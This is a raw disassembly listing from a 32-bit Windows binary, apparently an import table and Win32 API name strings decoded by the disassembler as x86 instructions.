  4286b5:	mov    WORD PTR [edx],es
  4286b7:	add    BYTE PTR [esi],al
  4286b9:	lea    eax,[edx]
  4286bb:	add    BYTE PTR [edx],bl
  4286bd:	lea    eax,[edx]
  4286bf:	add    BYTE PTR [edx],ch
  4286c1:	lea    eax,[edx]
  4286c3:	add    BYTE PTR [esi],dh
  4286c5:	lea    eax,[edx]
  4286c7:	add    BYTE PTR [ebp+ecx*4+0x2],al
  4286cb:	add    BYTE PTR [edx-0x73],dl
  4286ce:	add    al,BYTE PTR [eax]
  4286d0:	bound  ecx,QWORD PTR [ebp-0x7287fffe]
  4286d6:	add    al,BYTE PTR [eax]
  4286d8:	test   BYTE PTR [ebp-0x726ffffe],cl
  4286de:	add    al,BYTE PTR [eax]
  4286e0:	pushf  
  4286e1:	lea    eax,[edx]
  4286e3:	add    BYTE PTR [edx-0x3bfffd73],dh
  4286e9:	lea    eax,[edx]
  4286eb:	add    ah,dl
  4286ed:	lea    eax,[edx]
  4286ef:	add    dl,ah
  4286f1:	lea    eax,[edx]
  4286f3:	add    dh,dh
  4286f5:	lea    eax,[edx]
  4286f7:	add    BYTE PTR [esi+ecx*4],al
  4286fa:	add    al,BYTE PTR [eax]
  4286fc:	sbb    BYTE PTR [esi-0x71d5fffe],cl
  428702:	add    al,BYTE PTR [eax]
  428704:	cmp    BYTE PTR [esi-0x71abfffe],cl
  42870a:	add    al,BYTE PTR [eax]
  42870c:	data16 mov es,WORD PTR [edx]
  42870f:	add    BYTE PTR [esi-0x72],dh
  428712:	add    al,BYTE PTR [eax]
  428714:	nop
  428715:	mov    es,WORD PTR [edx]
  428717:	add    BYTE PTR [esi-0x4bfffd72],ah
  42871d:	mov    es,WORD PTR [edx]
  42871f:	add    dl,al
  428721:	mov    es,WORD PTR [edx]
  428723:	add    al,bl
  428725:	mov    es,WORD PTR [edx]
  428727:	add    ah,dh
  428729:	mov    es,WORD PTR [edx]
  42872b:	add    BYTE PTR [edx],al
  42872d:	pop    DWORD PTR [edx]
  42872f:	add    BYTE PTR [edi+ecx*4],dl
  428732:	add    al,BYTE PTR [eax]
  428734:	sub    BYTE PTR [edi-0x70c1fffe],cl
  42873a:	add    al,BYTE PTR [eax]
  42873c:	push   esp
  42873d:	pop    DWORD PTR [edx]
  42873f:	add    BYTE PTR [edx-0x71],ch
  428742:	add    al,BYTE PTR [eax]
  428744:	js     0x4286d5
  428746:	add    al,BYTE PTR [eax]
  428748:	mov    WORD PTR [edi-0x7063fffe],cs
  42874e:	add    al,BYTE PTR [eax]
  428750:	test   al,0x8f
  428752:	add    al,BYTE PTR [eax]
  428754:	mov    edx,0xca00028f
  428759:	pop    DWORD PTR [edx]
  42875b:	add    ah,bl
  42875d:	pop    DWORD PTR [edx]
  42875f:	add    dl,ch
  428761:	pop    DWORD PTR [edx]
  428763:	add    ah,bh
  428765:	pop    DWORD PTR [edx]
  428767:	add    BYTE PTR [edx],dl
  428769:	nop
  42876a:	add    al,BYTE PTR [eax]
  42876c:	cs nop
  42876e:	add    al,BYTE PTR [eax]
  428770:	inc    esp
  428771:	nop
  428772:	add    al,BYTE PTR [eax]
  428774:	push   esi
  428775:	nop
  428776:	add    al,BYTE PTR [eax]
  428778:	push   0x7a000290
  42877d:	nop
  42877e:	add    al,BYTE PTR [eax]
  428780:	mov    ss,WORD PTR [eax-0x6f63fffe]
  428786:	add    al,BYTE PTR [eax]
  428788:	lods   al,BYTE PTR ds:[esi]
  428789:	nop
  42878a:	add    al,BYTE PTR [eax]
  42878c:	mov    eax,0xc6000290
  428791:	nop
  428792:	add    al,BYTE PTR [eax]
  428794:	ficom  WORD PTR [eax-0x6f11fffe]
  42879a:	add    al,BYTE PTR [eax]
  42879c:	cld    
  42879d:	nop
  42879e:	add    al,BYTE PTR [eax]
  4287a0:	adc    BYTE PTR [ecx-0x6ee1fffe],dl
  4287a6:	add    al,BYTE PTR [eax]
  4287a8:	sub    dl,BYTE PTR [ecx-0x6ec3fffe]
  4287ae:	add    al,BYTE PTR [eax]
  4287b0:	dec    esi
  4287b1:	xchg   ecx,eax
  4287b2:	add    al,BYTE PTR [eax]
  4287b4:	pusha  
  4287b5:	xchg   ecx,eax
  4287b6:	add    al,BYTE PTR [eax]
  4287b8:	jbe    0x42874b
  4287ba:	add    al,BYTE PTR [eax]
  4287bc:	adc    BYTE PTR [ecx-0x6e6ffffe],0x2
  4287c3:	add    BYTE PTR [ecx+edx*4-0x6e55fffe],bl
  4287ca:	add    al,BYTE PTR [eax]
  4287cc:	mov    esi,0xca000291
  4287d1:	xchg   ecx,eax
  4287d2:	add    al,BYTE PTR [eax]
  4287d4:	ficom  WORD PTR [ecx-0x6e15fffe]
  4287da:	add    al,BYTE PTR [eax]
  4287dc:	cli    
  4287dd:	xchg   ecx,eax
  4287de:	add    al,BYTE PTR [eax]
  4287e0:	or     BYTE PTR [edx-0x6de1fffe],dl
  4287e6:	add    al,BYTE PTR [eax]
  4287e8:	add    BYTE PTR [eax],al
  4287ea:	add    BYTE PTR [eax],al
  4287ec:	ss xchg edx,eax
  4287ee:	add    al,BYTE PTR [eax]
  4287f0:	inc    esp
  4287f1:	xchg   edx,eax
  4287f2:	add    al,BYTE PTR [eax]
  4287f4:	push   esi
  4287f5:	xchg   edx,eax
  4287f6:	add    al,BYTE PTR [eax]
  4287f8:	outs   dx,BYTE PTR ds:[esi]
  4287f9:	xchg   edx,eax
  4287fa:	add    al,BYTE PTR [eax]
  4287fc:	adc    BYTE PTR [edx-0x6d6dfffe],0x2
  428803:	add    BYTE PTR [edx+edx*4-0x6d43fffe],ch
  42880a:	add    al,BYTE PTR [eax]
  42880c:	(bad)  
  42880d:	xchg   edx,eax
  42880e:	add    al,BYTE PTR [eax]
  428810:	fcom   DWORD PTR [edx-0x6d17fffe]
  428816:	add    al,BYTE PTR [eax]
  428818:	add    BYTE PTR [ebx-0x6ceffffe],dl
  42881e:	add    al,BYTE PTR [eax]
  428820:	and    BYTE PTR [ebx-0x6ccdfffe],dl
  428826:	add    al,BYTE PTR [eax]
  428828:	inc    esp
  428829:	xchg   ebx,eax
  42882a:	add    al,BYTE PTR [eax]
  42882c:	push   eax
  42882d:	xchg   ebx,eax
  42882e:	add    al,BYTE PTR [eax]
  428830:	pop    esp
  428831:	xchg   ebx,eax
  428832:	add    al,BYTE PTR [eax]
  428834:	jb     0x4287c9
  428836:	add    al,BYTE PTR [eax]
  428838:	xchg   BYTE PTR [ebx-0x6c63fffe],dl
  42883e:	add    al,BYTE PTR [eax]
  428840:	mov    al,0x93
  428842:	add    al,BYTE PTR [eax]
  428844:	(bad)  
  428845:	xchg   ebx,eax
  428846:	add    al,BYTE PTR [eax]
  428848:	fcom   DWORD PTR [ebx-0x6c1bfffe]
  42884e:	add    al,BYTE PTR [eax]
  428850:	hlt    
  428851:	xchg   ebx,eax
  428852:	add    al,BYTE PTR [eax]
  428854:	adc    dl,BYTE PTR [edx+eax*1+0x2942c00]
  42885b:	add    BYTE PTR [edx],bh
  42885d:	xchg   esp,eax
  42885e:	add    al,BYTE PTR [eax]
  428860:	dec    esi
  428861:	xchg   esp,eax
  428862:	add    al,BYTE PTR [eax]
  428864:	xchg   sp,ax
  428866:	add    al,BYTE PTR [eax]
  428868:	jp     0x4287fe
  42886a:	add    al,BYTE PTR [eax]
  42886c:	mov    dl,BYTE PTR [edx+eax*1+0x294a000]
  428873:	add    BYTE PTR [edx-0x3ffffd6c],dh
  428879:	xchg   esp,eax
  42887a:	add    al,BYTE PTR [eax]
  42887c:	rcl    BYTE PTR [edx+eax*1+0x294e000],cl
  428883:	add    al,dh
  428885:	xchg   esp,eax
  428886:	add    al,BYTE PTR [eax]
  428888:	push   es
  428889:	xchg   ebp,eax
  42888a:	add    al,BYTE PTR [eax]
  42888c:	sbb    al,0x95
  42888e:	add    al,BYTE PTR [eax]
  428890:	sub    al,0x95
  428892:	add    al,BYTE PTR [eax]
  428894:	inc    edx
  428895:	xchg   ebp,eax
  428896:	add    al,BYTE PTR [eax]
  428898:	dec    esp
  428899:	xchg   ebp,eax
  42889a:	add    al,BYTE PTR [eax]
  42889c:	pop    esi
  42889d:	xchg   ebp,eax
  42889e:	add    al,BYTE PTR [eax]
  4288a0:	outs   dx,BYTE PTR ds:[esi]
  4288a1:	xchg   ebp,eax
  4288a2:	add    al,BYTE PTR [eax]
  4288a4:	jl     0x42883b
  4288a6:	add    al,BYTE PTR [eax]
  4288a8:	xchg   edx,eax
  4288a9:	xchg   ebp,eax
  4288aa:	add    al,BYTE PTR [eax]
  4288ac:	add    BYTE PTR [eax],al
  4288ae:	add    BYTE PTR [eax],al
  4288b0:	xchg   edx,eax
  4288b1:	add    edx,DWORD PTR [edx+0x74]
  4288b4:	ins    BYTE PTR es:[edi],dx
  4288b5:	dec    ecx
  4288b6:	outs   dx,BYTE PTR ds:[esi]
  4288b7:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  4288bf:	jb     0x42892a
  4288c1:	outs   dx,BYTE PTR ds:[esi]
  4288c2:	add    BYTE PTR [bp+0x74],ch
  4288c6:	fs ins BYTE PTR es:[edi],dx
  4288c8:	ins    BYTE PTR es:[edi],dx
  4288c9:	cs fs ins BYTE PTR es:[edi],dx
  4288cc:	ins    BYTE PTR es:[edi],dx
  4288cd:	add    BYTE PTR [ecx+0x74654701],dl
  4288d3:	push   esi
  4288d4:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4288db:	dec    edi
  4288dc:	jb     0x428945
  4288de:	inc    ebp
  4288df:	js     0x4288e1
  4288e1:	add    BYTE PTR [edx+0x74654701],cl
  4288e7:	push   esp
  4288e8:	gs js  0x42895f
  4288eb:	inc    ebp
  4288ec:	js     0x428962
  4288ee:	outs   dx,BYTE PTR gs:[esi]
  4288f0:	je     0x428942
  4288f2:	outs   dx,DWORD PTR ds:[esi]
  4288f3:	imul   ebp,DWORD PTR [esi+0x74],0x1fb0057
  4288fa:	push   ebx
  4288fb:	gs je  0x428952
  4288fe:	gs js  0x428975
  428901:	inc    ecx
  428902:	ins    BYTE PTR es:[edi],dx
  428903:	imul   esp,DWORD PTR [edi+0x6e],0xd50000
  42890a:	inc    ebp
  42890b:	js     0x428981
  42890d:	push   esp
  42890e:	gs js  0x428985
  428911:	dec    edi
  428912:	jne    0x428988
  428914:	push   edi
  428915:	add    BYTE PTR [eax],dl
  428917:	add    dl,BYTE PTR [edx+esi*2+0x61]
  42891b:	outs   dx,BYTE PTR ds:[esi]
  42891c:	jae    0x42898a
  42891e:	popa   
  42891f:	je     0x428986
  428921:	inc    ebx
  428922:	push   0x65737261
  428927:	je     0x428972
  428929:	outs   dx,BYTE PTR ds:[esi]
  42892a:	outs   dx,WORD PTR ds:[esi]
  42892c:	add    BYTE PTR [eax],al
  42892e:	pop    ss
  42892f:	add    dl,BYTE PTR [edi+0x69]
  428932:	fs outs dx,BYTE PTR gs:[esi]
  428935:	push   eax
  428936:	popa   
  428937:	je     0x4289a1
  428939:	add    BYTE PTR [ebp+0x65724300],cl
  42893f:	popa   
  428940:	je     0x4289a7
  428942:	inc    ebx
  428943:	outs   dx,DWORD PTR ds:[esi]
  428944:	ins    DWORD PTR es:[edi],dx
  428945:	jo     0x4289a8
  428947:	je     0x4289b2
  428949:	bound  ebp,QWORD PTR [ebp+eiz*2+0x44]
  42894d:	inc    ebx
  42894e:	add    BYTE PTR [eax],al
  428950:	mov    bh,0x1
  428952:	push   eax
  428953:	outs   dx,DWORD PTR ds:[esi]
  428954:	ins    BYTE PTR es:[edi],dx
  428955:	jns    0x4289c3
  428957:	imul   ebp,DWORD PTR [esi+0x65],0x1940000
  42895e:	inc    edi
  42895f:	gs je  0x4289b9
  428962:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  428969:	addr16 inc ebp
  42896b:	js     0x42896d
  42896d:	add    cl,ch
  42896f:	add    DWORD PTR [ebx+0x65],edx
  428972:	je     0x4289c0
  428974:	popa   
  428975:	jns    0x4289e6
  428977:	jne    0x4289ed
  428979:	add    bl,dl
  42897b:	add    DWORD PTR [ebx+0x65],edx
  42897e:	je     0x4289c1
  428980:	bound  ebp,QWORD PTR [edi+0x72]
  428983:	je     0x4289d5
  428985:	jb     0x4289f6
  428987:	arpl   WORD PTR [eax],ax
  428989:	add    BYTE PTR [edx],cl
  42898b:	add    dl,BYTE PTR [ebx+0x74]
  42898e:	jb     0x4289f5
  428990:	je     0x4289f5
  428992:	push   0x69424944
  428997:	je     0x428a0c
  428999:	add    BYTE PTR [ebx+0x1],al
  42899c:	inc    edi
  42899d:	gs je  0x4289e4
  4289a0:	dec    ecx
  4289a1:	inc    edx
  4289a2:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x655301eb
  4289aa:	je     0x4289f9
  4289ac:	popa   
  4289ad:	jo     0x4289fc
  4289af:	outs   dx,DWORD PTR ds:[esi]
  4289b0:	fs add BYTE PTR gs:[eax],al
  4289b4:	daa    
  4289b5:	add    DWORD PTR [edi+0x65],eax
  4289b8:	je     0x4289fc
  4289ba:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  4289be:	add    BYTE PTR gs:[ebx+0x66664f01],ah
  4289c5:	jae    0x428a2c
  4289c7:	je     0x428a1b
  4289c9:	outs   dx,BYTE PTR ds:[si]
  4289cb:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  4289d2:	jo     0x428a47
  4289d4:	gs add ah,cl
  4289d7:	add    DWORD PTR [ebx+0x63],edx
  4289da:	popa   
  4289db:	ins    BYTE PTR es:[edi],dx
  4289dc:	gs push edi
  4289de:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4289e5:	je     0x428a2c
  4289e7:	js     0x4289e9
  4289e9:	add    BYTE PTR [edx+0x1],bh
  4289ec:	inc    edi
  4289ed:	gs je  0x428a43
  4289f0:	je     0x428a61
  4289f2:	arpl   WORD PTR [ebx+0x4f],bp
  4289f5:	bound  ebp,QWORD PTR [edx+0x65]
  4289f8:	arpl   WORD PTR [eax+eax*1+0x0],si
  4289fc:	call   0x5465:0x6e694c01
  428a03:	outs   dx,DWORD PTR ds:[esi]
  428a04:	add    BYTE PTR [eax],al
  428a06:	mov    dh,0x1
  428a08:	push   eax
  428a09:	outs   dx,DWORD PTR ds:[esi]
  428a0a:	ins    BYTE PTR es:[edi],dx
  428a0b:	jns    0x428a74
  428a0d:	outs   dx,DWORD PTR ds:[esi]
  428a0e:	outs   dx,BYTE PTR ds:[esi]
  428a0f:	add    BYTE PTR [esi+0x1],bh
  428a12:	inc    edi
  428a13:	gs je  0x428a6a
  428a16:	gs js  0x428a8d
  428a19:	inc    ecx
  428a1a:	ins    BYTE PTR es:[edi],dx
  428a1b:	imul   esp,DWORD PTR [edi+0x6e],0x18c0000
  428a22:	inc    edi
  428a23:	gs je  0x428a7a
  428a26:	gs js  0x428a9d
  428a29:	inc    esi
  428a2a:	popa   
  428a2b:	arpl   WORD PTR [ebp+0x57],sp
  428a2e:	add    BYTE PTR [eax],al
  428a30:	mov    ebx,0x61655201
  428a35:	ins    BYTE PTR es:[edi],dx
  428a36:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428a3d:	je     0x428ab3
  428a3f:	add    BYTE PTR gs:[eax],al
  428a42:	mov    DWORD PTR [ecx],0x69736552
  428a48:	jp     0x428aaf
  428a4a:	push   eax
  428a4b:	popa   
  428a4c:	ins    BYTE PTR es:[edi],dx
  428a4d:	gs je  0x428ac4
  428a50:	add    BYTE PTR gs:[ecx+0x6d6f4300],al
  428a57:	bound  ebp,QWORD PTR [ecx+0x6e]
  428a5a:	gs push edx
  428a5c:	outs   dx,BYTE PTR ds:[si]
  428a5e:	add    BYTE PTR [eax],al
  428a60:	push   cs
  428a61:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  428a65:	je     0x428ab6
  428a67:	jne    0x428add
  428a69:	inc    ecx
  428a6a:	add    BYTE PTR [eax],al
  428a6c:	test   DWORD PTR [ecx],0x52746553
  428a72:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428a77:	outs   dx,BYTE PTR ds:[esi]
  428a78:	add    BYTE PTR [eax],al
  428a7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428a7b:	add    BYTE PTR [ebx+0x72],al
  428a7e:	gs popa 
  428a80:	je     0x428ae7
  428a82:	push   eax
  428a83:	popa   
  428a84:	ins    BYTE PTR es:[edi],dx
  428a85:	gs je  0x428afc
  428a88:	add    BYTE PTR gs:[ecx+eax*1],ah
  428a8c:	inc    edi
  428a8d:	gs je  0x428ad2
  428a90:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  428a98:	jae    0x428a9a
  428a9a:	mov    DWORD PTR [eax],0x6d756e45
  428aa0:	inc    esi
  428aa1:	outs   dx,DWORD PTR ds:[esi]
  428aa2:	outs   dx,BYTE PTR ds:[esi]
  428aa3:	je     0x428b18
  428aa5:	push   edi
  428aa6:	add    BYTE PTR [eax],al
  428aa8:	lods   al,BYTE PTR ds:[esi]
  428aa9:	add    BYTE PTR [ebx+0x72],al
  428aac:	gs popa 
  428aae:	je     0x428b15
  428ab0:	push   edx
  428ab1:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428ab6:	outs   dx,BYTE PTR ds:[esi]
  428ab7:	dec    ecx
  428ab8:	outs   dx,BYTE PTR ds:[esi]
  428ab9:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  428ac1:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428ac5:	gs inc esp
  428ac7:	inc    esp
  428ac8:	inc    ecx
  428ac9:	add    ch,dl
  428acb:	add    DWORD PTR [ebx+0x65],edx
  428ace:	je     0x428b12
  428ad0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  428ad8:	jae    0x428ada
  428ada:	mov    BYTE PTR [eax],al
  428adc:	inc    ebx
  428add:	jb     0x428b44
  428adf:	popa   
  428ae0:	je     0x428b47
  428ae2:	inc    edx
  428ae3:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  428aeb:	imul   esi,DWORD PTR [edx+0x65],0x7463
  428af2:	mov    es,WORD PTR [ecx]
  428af4:	inc    edi
  428af5:	gs je  0x428b4c
  428af8:	gs js  0x428b6f
  428afb:	dec    ebp
  428afc:	gs je  0x428b71
  428aff:	imul   esp,DWORD PTR [ebx+0x73],0x1da0057
  428b06:	push   ebx
  428b07:	gs je  0x428b4c
  428b0a:	jb     0x428b81
  428b0c:	jae    0x428b76
  428b0e:	dec    edi
  428b0f:	jb     0x428b78
  428b11:	inc    ebp
  428b12:	js     0x428b14
  428b14:	mov    esp,0x63655201
  428b19:	je     0x428b64
  428b1b:	outs   dx,BYTE PTR ds:[esi]
  428b1c:	push   edx
  428b1d:	imul   ebp,DWORD PTR gs:[bx+0x6e],0xcd0000
  428b26:	inc    ebp
  428b27:	jae    0x428b8c
  428b29:	popa   
  428b2a:	jo     0x428b91
  428b2c:	add    BYTE PTR [eax],al
  428b2e:	scas   eax,DWORD PTR es:[edi]
  428b2f:	add    DWORD PTR [eax+0x6f],edx
  428b32:	ins    BYTE PTR es:[edi],dx
  428b33:	jns    0x428b77
  428b35:	gs jp  0x428ba1
  428b38:	gs jb  0x428b3b
  428b3b:	add    BYTE PTR [ebx+0x65724300],ch
  428b41:	popa   
  428b42:	je     0x428ba9
  428b44:	push   edx
  428b45:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428b4a:	outs   dx,BYTE PTR ds:[esi]
  428b4b:	add    BYTE PTR [edi+0x65724300],cl
  428b51:	popa   
  428b52:	je     0x428bb9
  428b54:	inc    esp
  428b55:	inc    ebx
  428b56:	push   edi
  428b57:	add    BYTE PTR ds:0x74654701,bh
  428b5d:	inc    ebx
  428b5e:	jne    0x428bd2
  428b60:	jb     0x428bc7
  428b62:	outs   dx,BYTE PTR ds:[esi]
  428b63:	je     0x428bb4
  428b65:	bound  ebp,QWORD PTR [edx+0x65]
  428b68:	arpl   WORD PTR [eax+eax*1+0x0],si
  428b6c:	inc    edi
  428b6d:	inc    esp
  428b6e:	dec    ecx
  428b6f:	xor    esi,DWORD PTR [edx]
  428b71:	cs fs ins BYTE PTR es:[edi],dx
  428b74:	ins    BYTE PTR es:[edi],dx
  428b75:	add    BYTE PTR [ebx+0x6f],ah
  428b78:	outs   dx,BYTE PTR ds:[esi]
  428b79:	jae    0x428bea
  428b7b:	ins    BYTE PTR es:[edi],dx
  428b7c:	gs cs fs ins BYTE PTR es:[edi],dx
  428b80:	ins    BYTE PTR es:[edi],dx
  428b81:	add    BYTE PTR [ecx],bh
  428b83:	add    BYTE PTR [ebx+0x68],al
  428b86:	popa   
  428b87:	jb     0x428bde
  428b89:	jo     0x428bfb
  428b8b:	gs jb  0x428be5
  428b8e:	add    BYTE PTR [eax],al
  428b90:	dec    esi
  428b91:	add    dl,BYTE PTR [ebx+0x65]
  428b94:	je     0x428be3
  428b96:	outs   dx,BYTE PTR gs:[esi]
  428b98:	jne    0x428be3
  428b9a:	je     0x428c01
  428b9c:	ins    DWORD PTR es:[edi],dx
  428b9d:	dec    ecx
  428b9e:	outs   dx,BYTE PTR ds:[esi]
  428b9f:	outs   dx,WORD PTR ds:[esi]
  428ba1:	push   edi
  428ba2:	add    BYTE PTR [eax],al
  428ba4:	scas   al,BYTE PTR es:[edi]
  428ba5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428ba9:	fs inc ebx
  428bab:	jne    0x428c1f
  428bad:	jae    0x428c1e
  428baf:	jb     0x428c08
  428bb1:	add    BYTE PTR [eax+0x0],bl
  428bb4:	inc    ebx
  428bb5:	jb     0x428c1c
  428bb7:	popa   
  428bb8:	je     0x428c1f
  428bba:	inc    esp
  428bbb:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  428bc2:	jb     0x428c25
  428bc4:	ins    DWORD PTR es:[edi],dx
  428bc5:	inc    ecx
  428bc6:	add    BYTE PTR [eax],al
  428bc8:	popf   
  428bc9:	add    DWORD PTR [ecx+0x73],ecx
  428bcc:	dec    ebp
  428bcd:	outs   dx,BYTE PTR gs:[esi]
  428bcf:	jne    0x428bd1
  428bd1:	add    BYTE PTR [eax+0x1],ch
  428bd4:	inc    edi
  428bd5:	gs je  0x428c2f
  428bd8:	imul   ebp,DWORD PTR [esi+0x64],0x6200776f
  428bdf:	add    DWORD PTR [edi+0x65],eax
  428be2:	je     0x428c38
  428be4:	outs   dx,DWORD PTR ds:[esi]
  428be5:	jo     0x428c3e
  428be7:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428bee:	mov    ds:0x57734901,eax
  428bf3:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  428bfa:	jae    0x428c65
  428bfc:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  428c00:	sub    eax,0x74654701
  428c05:	dec    ebp
  428c06:	outs   dx,BYTE PTR gs:[esi]
  428c08:	jne    0x428c4d
  428c0a:	push   0x4d6b6365
  428c0f:	popa   
  428c10:	jb     0x428c7d
  428c12:	inc    esp
  428c13:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  428c1a:	outs   dx,BYTE PTR ds:[esi]
  428c1b:	jae    0x428c1d
  428c1d:	add    BYTE PTR [edx],bl
  428c1f:	add    BYTE PTR [ebx+0x61],al
  428c22:	ins    BYTE PTR es:[edi],dx
  428c23:	ins    BYTE PTR es:[edi],dx
  428c24:	push   edi
  428c25:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428c2c:	outs   dx,DWORD PTR ds:[esi]
  428c2d:	arpl   WORD PTR [ecx+0x0],ax
  428c30:	repz add BYTE PTR [edi+0x65],al
  428c34:	je     0x428c79
  428c36:	popa   
  428c37:	jb     0x428c9e
  428c39:	je     0x428c8b
  428c3b:	outs   dx,DWORD PTR ds:[esi]
  428c3c:	jae    0x428c3e
  428c3e:	ret    0x7702
  428c41:	jbe    0x428cb6
  428c43:	jo     0x428cb7
  428c45:	imul   ebp,DWORD PTR [esi+0x74],0x5766
  428c4c:	test   al,0x1
  428c4e:	dec    esp
  428c4f:	outs   dx,DWORD PTR ds:[esi]
  428c50:	popa   
  428c51:	fs inc ecx
  428c53:	arpl   WORD PTR [ebx+0x65],sp
  428c56:	ins    BYTE PTR es:[edi],dx
  428c57:	gs jb  0x428cbb
  428c5a:	je     0x428ccb
  428c5c:	jb     0x428cd1
  428c5e:	push   edi
  428c5f:	add    BYTE PTR [edi],cl
  428c61:	add    BYTE PTR [edx+0x72],al
  428c64:	imul   ebp,DWORD PTR [esi+0x67],0x646e6957
  428c6b:	outs   dx,DWORD PTR ds:[esi]
  428c6c:	ja     0x428cc2
  428c6e:	outs   dx,DWORD PTR ds:[esi]
  428c6f:	push   esp
  428c70:	outs   dx,DWORD PTR ds:[esi]
  428c71:	jo     0x428c73
  428c73:	add    BYTE PTR [ecx+0x66654400],cl
  428c79:	inc    esi
  428c7a:	jb     0x428cdd
  428c7c:	ins    DWORD PTR es:[edi],dx
  428c7d:	gs push eax
  428c7f:	jb     0x428cf0
  428c81:	arpl   WORD PTR [ecx+0x0],ax
  428c84:	mov    ebx,0x61724400
  428c89:	ja     0x428cdf
  428c8b:	gs js  0x428d02
  428c8e:	inc    ebp
  428c8f:	js     0x428ce8
  428c91:	add    BYTE PTR [edx+0x666e4901],al
  428c97:	ins    BYTE PTR es:[edi],dx
  428c98:	popa   
  428c99:	je     0x428d00
  428c9b:	push   edx
  428c9c:	arpl   WORD PTR gs:[eax+eax*1+0x5],si
  428ca1:	add    dl,BYTE PTR [edx+0x65]
  428ca4:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  428cac:	popa   
  428cad:	jae    0x428d22
  428caf:	push   edi
  428cb0:	add    BYTE PTR [eax],al
  428cb2:	inc    ebp
  428cb3:	add    dl,BYTE PTR [ebx+0x65]
  428cb6:	je     0x428d04
  428cb8:	popa   
  428cb9:	jae    0x428d2f
  428cbb:	inc    ebp
  428cbc:	jb     0x428d30
  428cbe:	outs   dx,DWORD PTR ds:[esi]
  428cbf:	jb     0x428d06
  428cc1:	js     0x428cc3
  428cc3:	add    BYTE PTR [edx+0x43734901],dl
  428cc9:	push   0x70557261
  428cce:	jo     0x428d35
  428cd0:	jb     0x428d13
  428cd2:	add    BYTE PTR [eax],al
  428cd4:	inc    ebx
  428cd5:	add    BYTE PTR [ebx+0x6c],al
  428cd8:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  428cdf:	arpl   WORD PTR [edx+0x65],si
  428ce2:	outs   dx,BYTE PTR gs:[esi]
  428ce4:	add    BYTE PTR [eax],al
  428ce6:	push   ecx
  428ce7:	add    dl,BYTE PTR [ebx+0x65]
  428cea:	je     0x428d3c
  428cec:	popa   
  428ced:	jb     0x428d54
  428cef:	outs   dx,BYTE PTR ds:[esi]
  428cf0:	je     0x428cf2
  428cf2:	xchg   ecx,eax
  428cf3:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428cf7:	arpl   WORD PTR [ebx+0x50],bp
  428cfa:	outs   dx,DWORD PTR ds:[esi]
  428cfb:	jo     0x428d72
  428cfd:	jo     0x428d4c
  428cff:	outs   dx,BYTE PTR gs:[esi]
  428d01:	jne    0x428d48
  428d03:	js     0x428d05
  428d05:	add    BYTE PTR [edx],ah
  428d07:	add    DWORD PTR [edi+0x65],eax
  428d0a:	je     0x428d57
  428d0c:	gs jns 0x428d71
  428d0f:	outs   dx,DWORD PTR ds:[esi]
  428d10:	popa   
  428d11:	jb     0x428d77
  428d13:	dec    esp
  428d14:	popa   
  428d15:	jns    0x428d86
  428d17:	jne    0x428d8d
  428d19:	add    bl,bh
  428d1b:	add    BYTE PTR [edi+0x65],al
  428d1e:	je     0x428d63
  428d20:	ins    BYTE PTR es:[edi],dx
  428d21:	popa   
  428d22:	jae    0x428d97
  428d24:	dec    esi
  428d25:	popa   
  428d26:	ins    DWORD PTR es:[edi],dx
  428d27:	gs push edi
  428d29:	add    ch,bl
  428d2b:	add    BYTE PTR [ebp+0x71],al
  428d2e:	jne    0x428d91
  428d30:	ins    BYTE PTR es:[edi],dx
  428d31:	push   edx
  428d32:	arpl   WORD PTR gs:[eax+eax*1+0x32],si
  428d37:	add    dl,BYTE PTR [ebx+0x65]
  428d3a:	je     0x428d7f
  428d3c:	popa   
  428d3d:	jb     0x428da4
  428d3f:	je     0x428d91
  428d41:	outs   dx,DWORD PTR ds:[esi]
  428d42:	jae    0x428d44
  428d44:	and    al,0x0
  428d46:	inc    ebx
  428d47:	push   0x65676e61
  428d4c:	dec    ebp
  428d4d:	outs   dx,BYTE PTR gs:[esi]
  428d4f:	jne    0x428da8
  428d51:	add    BYTE PTR [eax+0x73654400],bl
  428d57:	je     0x428dcb
  428d59:	outs   dx,DWORD PTR ds:[esi]
  428d5a:	jns    0x428db3
  428d5c:	imul   ebp,DWORD PTR [esi+0x64],0xf500776f
  428d63:	add    DWORD PTR [eax+0x6f],edx
  428d66:	jae    0x428ddc
  428d68:	push   esp
  428d69:	push   0x64616572
  428d6e:	dec    ebp
  428d6f:	gs jae 0x428de5
  428d72:	popa   
  428d73:	addr16 gs push edi
  428d76:	add    BYTE PTR [eax],al
  428d78:	push   edi
  428d79:	add    dl,BYTE PTR [ebx+0x65]
  428d7c:	je     0x428dce
  428d7e:	jb     0x428def
  428d80:	jo     0x428dd9
  428d82:	add    BYTE PTR [eax],al
  428d84:	mov    al,0x1
  428d86:	dec    esp
  428d87:	outs   dx,DWORD PTR ds:[esi]
  428d88:	popa   
  428d89:	fs dec ecx
  428d8b:	arpl   WORD PTR [edi+0x6e],bp
  428d8e:	push   edi
  428d8f:	add    bl,bh
  428d91:	add    DWORD PTR [eax+0x74],edx
